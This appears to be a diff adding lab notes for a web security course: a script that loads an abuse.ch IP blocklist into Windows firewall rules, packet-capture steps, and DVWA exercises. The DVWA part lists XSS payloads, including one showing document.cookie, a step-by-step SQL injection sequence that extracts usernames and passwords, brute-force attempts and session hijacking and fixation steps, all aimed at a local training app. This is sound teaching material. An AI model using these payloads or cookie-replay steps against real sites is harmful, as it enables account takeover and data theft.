@@ -1,0 +1,250 @@
+1) FIREWALL
+===========
+
+import requests, csv, subprocess
+
+# source: Abuse CH
+response = requests.get(
+    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+).text
+
+rule = 'netsh advfirewall firewall delete rule name="BadIP"'
+subprocess.run(["PowerShell", "-Command", rule])
+
+mycsv = csv.reader(
+    filter(lambda x: not x.startswith("#"), response.splitlines())
+)
+
+for row in mycsv:
+    ip = row[1]
+    if ip != "dst_ip":
+        print("Added Rule to block:", ip)
+        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
+        subprocess.run(["PowerShell", "-Command", rule])
+
+
+2) PACKET SNIFFING – TRAFFIC ANALYSIS
+=====================================
+
+Start local HTTP server (one terminal):
+python3 -m http.server 8080
+
+Capture packets (another terminal):
+sudo tcpdump -i any -w capture.pcap port 8080
+
+Generate traffic:
+http://localhost:8080
+
+Stop capture:
+Ctrl + C
+
+Open capture file:
+capture.pcap
+
+Wireshark filter:
+http.request.method == "POST"
+
+
+3) XSS PAYLOADS (DVWA)
+======================
+
+1) INSTALL DVWA (IF NOT INSTALLED)
+sudo apt update
+sudo apt install dvwa -y
+
+http://localhost/dvwa
+OR
+http://127.0.0.1/dvwa
+
+2) START SERVICES (APACHE & MYSQL)
+sudo service apache2 start
+sudo service mysql start
+sudo dvwa-start
+
+Login:
+Username: admin
+Password: password
+
+Reflected XSS:
+<script>alert('XSS')</script>
+
+Stored XSS (Name field):
+<h1>Hacked</h1>
+
+Stored XSS (Message field):
+<script>alert('Stored XSS')</script>
+
+DOM-Based XSS (Add in URL):
+#<script>alert('DOM XSS')</script>
+
+Cookie Capture Demo:
+<script>alert(document.cookie)</script>
+
+
+4) SQL INJECTION PAYLOADS (DVWA)
+================================
+
+Normal Input:
+1
+
+Authentication Bypass:
+1' OR '1'='1
+
+Find Number of Columns:
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+UNION Test:
+1' UNION SELECT 1,2-- -
+
+Extract Database Name:
+1' UNION SELECT database(),2-- -
+
+Extract Table Names:
+1' UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema=database()-- -
+
+Extract Column Names:
+1' UNION SELECT column_name,2
+FROM information_schema.columns
+WHERE table_name='users'-- -
+
+Extract Username & Password:
+1' UNION SELECT user,password FROM users-- -
+
+5)LAB EXPERIMENT: AUTHENTICATION & SESSION MANAGEMENT (DVWA)
+==========================================================
+
+PART A: START DVWA
+==================
+
+Start services:
+sudo service apache2 start
+sudo service mysql start
+
+Open DVWA:
+http://127.0.0.1/dvwa
+
+Login:
+Username: admin
+Password: password
+
+Set Security Level:
+DVWA Security → LOW → Submit
+
+
+PART B: TESTING AUTHENTICATION WEAKNESS
+=======================================
+
+Open module:
+DVWA → Vulnerabilities → Brute Force
+
+
+TEST 1: WEAK PASSWORD LOGIN
+---------------------------
+Username: admin
+Password: password
+
+
+TEST 2: MANUAL BRUTE FORCE ATTACK
+---------------------------------
+
+Attempt 1
+Username: admin
+Password: admin
+
+Attempt 2
+Username: admin
+Password: 123456
+
+Attempt 3
+Username: admin
+Password: password
+
+(Observe: unlimited attempts allowed)
+
+
+PART C: SESSION MANAGEMENT TESTING
+==================================
+
+EXPERIMENT 3: SESSION ID ANALYSIS
+---------------------------------
+
+Right Click → Inspect → Storage → Cookies
+Look for:
+PHPSESSID
+
+
+EXPERIMENT 4: SESSION HIJACKING
+-------------------------------
+
+Step 1: Victim Login
+http://127.0.0.1/dvwa
+Login as admin
+
+Step 2: Copy Session ID
+Inspect → Storage → Cookies → PHPSESSID
+
+Step 3: Open Private Window
+Ctrl + Shift + P
+
+Step 4: Open DVWA
+http://127.0.0.1/dvwa
+
+Step 5: Replace Cookie Value
+Inspect → Storage → Cookies
+Replace PHPSESSID with copied value
+
+Step 6: Refresh page
+F5
+
+(Result: logged in without password)
+
+
+EXPERIMENT 5: SESSION FIXATION
+------------------------------
+
+Step 1: Open DVWA (do NOT login)
+http://127.0.0.1/dvwa
+
+Step 2: Note Session ID
+Inspect → Storage → Cookies → PHPSESSID
+
+Step 3: Login in same window
+Username: admin
+Password: password
+
+Step 4: Check Session ID again
+
+IF same → Session Fixation vulnerability
+IF changed → secure
+
+
+EXPERIMENT 6: SESSION REUSE AFTER LOGOUT
+----------------------------------------
+
+Step 1: Login normally
+http://127.0.0.1/dvwa
+
+Step 2: Copy PHPSESSID
+Inspect → Storage → Cookies
+
+Step 3: Logout
+
+Step 4: Open Private Window
+Ctrl + Shift + P
+
+Step 5: Open DVWA
+http://127.0.0.1/dvwa
+
+Step 6: Paste OLD PHPSESSID
+Inspect → Storage → Cookies
+
+Step 7: Open internal page
+http://127.0.0.1/dvwa/index.php
+OR
+http://127.0.0.1/dvwa/vulnerabilities/brute/
+
+(Result: logged in again without password)
